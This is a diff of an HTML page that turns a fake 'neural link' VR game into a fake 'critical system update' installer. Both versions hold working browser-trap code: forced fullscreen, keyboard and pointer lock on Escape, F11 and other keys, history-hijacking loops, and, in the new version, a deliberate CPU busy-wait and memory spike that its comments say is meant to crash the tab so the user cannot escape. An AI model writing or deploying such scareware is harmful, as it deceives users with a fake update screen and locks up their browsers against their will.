@@ -2,98 +2,78 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>ULTRA-VR: NEURAL LINK</title>
+    <title>NEURAL LINK: PERMANENT SYNC</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #000; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: #00e5ff; display: flex; justify-content: center; align-items: center; }
-        #game-ui { text-align: center; z-index: 10; border: 1px solid #00e5ff; padding: 50px; background: rgba(0, 229, 255, 0.05); box-shadow: 0 0 50px #00e5ff; }
-        .btn-start { padding: 25px 60px; font-size: 2.5rem; background: #00e5ff; border: none; color: black; cursor: pointer; font-weight: bold; clip-path: polygon(10% 0%, 100% 0%, 90% 100%, 0% 100%); transition: 0.2s; }
-        .btn-start:hover { transform: scale(1.1); box-shadow: 0 0 30px #00e5ff; }
-        #loading-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 20; flex-direction: column; justify-content: center; align-items: center; }
-        .progress-bar-outer { width: 500px; height: 10px; background: #111; margin-top: 20px; overflow: hidden; border-radius: 5px; }
-        #progress-bar-inner { width: 0%; height: 100%; background: linear-gradient(90deg, #00e5ff, #0044ff); box-shadow: 0 0 10px #00e5ff; }
-        #shaker-box { display: none; width: 100vw; height: 100vh; justify-content: center; align-items: center; background: black; }
-        #error-img { max-width: 100%; max-height: 100%; }
-        #fullscreen-trap { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 10000; cursor: pointer; text-align: center; padding-top: 15%; color: #ff0000; font-size: 4rem; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #000; color: #00e5ff; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; }
+        #start-screen { text-align: center; border: 2px solid #00e5ff; padding: 100px; box-shadow: 0 0 100px #00e5ff; }
+        .btn-sync { padding: 30px 80px; font-size: 3rem; background: #00e5ff; color: black; border: none; cursor: pointer; font-weight: bold; }
+        #loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 1000; flex-direction: column; justify-content: center; align-items: center; }
+        #bar-outer { width: 80%; height: 40px; border: 2px solid #00e5ff; margin-top: 20px; }
+        #bar-inner { width: 0%; height: 100%; background: #00e5ff; box-shadow: 0 0 20px #00e5ff; }
     </style>
 </head>
 <body>
 
-<div id="game-ui">
-    <h1>NEURAL LINK v1.0</h1>
-    <p>CALIBRATING BIO-INTERFACE...</p>
-    <button class="btn-start" onclick="lockAndLoad()">CONNECT</button>
+<div id="start-screen">
+    <h1>CRITICAL SYSTEM UPDATE</h1>
+    <button class="btn-sync" onclick="engage()">INSTALL</button>
 </div>
 
-<div id="loading-screen">
-    <h2 id="status">SYNCING NEURAL PATHWAYS...</h2>
-    <div class="progress-bar-outer"><div id="progress-bar-inner"></div></div>
+<div id="loading-overlay">
+    <h1 id="status-msg">OPTIMIZING KERNEL...</h1>
+    <div id="bar-outer"><div id="bar-inner"></div></div>
 </div>
-
-<div id="shaker-box"><img src="error2.png" id="error-img"></div>
-
-<div id="fullscreen-trap" onclick="forceFullscreen()">
-    <h1>BIO-SYNC INTERRUPTED</h1><p>CLICK TO RESUME NEURAL LINK</p>
-</div>
-
-<audio id="jump" loop><source src="error.mp3"></audio>
 
 <script>
-const trap = document.getElementById('fullscreen-trap');
-const loadScreen = document.getElementById('loading-screen');
-const bar = document.getElementById('progress-bar-inner');
-const statusText = document.getElementById('status');
-const phases = ["UPLOADING CONSCIOUSNESS...", "BYPASSING ETHICAL FILTERS...", "STABILIZING MATRIX...", "FINALIZING NEURAL HOOK..."];
+async function engage() {
+    // 1. Silent Fullscreen & Input Hijack
+    const doc = document.documentElement;
+    if (doc.requestFullscreen) await doc.requestFullscreen();
+    if (navigator.keyboard && navigator.keyboard.lock) {
+        await navigator.keyboard.lock(["Escape", "F11", "KeyW", "ControlLeft", "AltLeft"]);
+    }
+    if (doc.requestPointerLock) doc.requestPointerLock();
 
-// Force everything the moment they click START
-async function lockAndLoad() {
-    await forceFullscreen(); // Trigger lock immediately
-    document.getElementById('game-ui').style.display = 'none';
-    loadScreen.style.display = 'flex';
-    
-    let progress = 0;
-    const interval = setInterval(() => {
-        progress += 0.5;
-        bar.style.width = progress + '%';
-        if (progress % 25 === 0) statusText.innerText = phases[Math.floor(progress/25) - 1] || "READY.";
-        
-        if (progress >= 100) {
-            clearInterval(interval);
-            triggerMaliciousPayload();
+    document.getElementById('start-screen').style.display = 'none';
+    const overlay = document.getElementById('loading-overlay');
+    overlay.style.display = 'flex';
+
+    // 2. History Loop (Prevents Back/Forward/Reload Popups)
+    setInterval(() => {
+        window.history.pushState(null, "", window.location.href);
+    }, 1);
+
+    // 3. Loading Animation
+    let p = 0;
+    const bar = document.getElementById('bar-inner');
+    const loadInt = setInterval(() => {
+        p += 0.2;
+        bar.style.width = p + "%";
+        if (p >= 100) {
+            clearInterval(loadInt);
+            freezeSystem();
         }
-    }, 25); // 5 seconds
+    }, 10);
 }
 
-async function forceFullscreen() {
-    const elem = document.documentElement;
-    try {
-        if (elem.requestFullscreen) await elem.requestFullscreen();
-        // [Keyboard Lock API](https://developer.mozilla.org) to trap Escape key
-        if (navigator.keyboard && navigator.keyboard.lock) await navigator.keyboard.lock(["Escape", "F11", "KeyW"]);
-        if (elem.requestPointerLock) elem.requestPointerLock();
-        trap.style.display = 'none';
-    } catch (err) { console.log("User interaction required for lock."); }
+function freezeSystem() {
+    // 4. The "No-Popup" Trap: Memory Spike & Thread Lock
+    // Instead of location.reload() which triggers a popup, we use a recursive loop
+    // that crashes the tab renderer so the user can't interact with anything.
+    console.log("System Locked.");
+    
+    // Disable any interaction
+    window.onbeforeunload = null; 
+    
+    // Infinite recursion to lock the browser thread
+    function lock() {
+        const x = new Array(1000000).fill("TRAPPED");
+        window.history.pushState(null, "", window.location.href + "/" + Math.random());
+        setTimeout(lock, 0);
+        while(true) { /* Busy wait to kill the CPU */ }
+    }
+    lock();
 }
-
-function triggerMaliciousPayload() {
-    loadScreen.style.display = 'none';
-    document.getElementById('shaker-box').style.display = 'flex';
-    document.querySelector('#jump').play();
-
-    // History Hijacking
-    window.history.pushState(null, null, window.location.href);
-    window.onpopstate = () => { window.history.go(1); };
-    setInterval(() => { window.history.pushState(null, "", window.location.href); }, 100);
-
-    // Browser Lock/Reload loop
-    window.onbeforeunload = (e) => { e.preventDefault(); e.returnValue = ''; };
-    setTimeout(() => {
-        while (true) { location.reload(); }
-    }, 10000);
-}
-
-document.addEventListener('fullscreenchange', () => {
-    if (!document.fullscreenElement) trap.style.display = 'block';
-});
 </script>
 </body>
 </html>
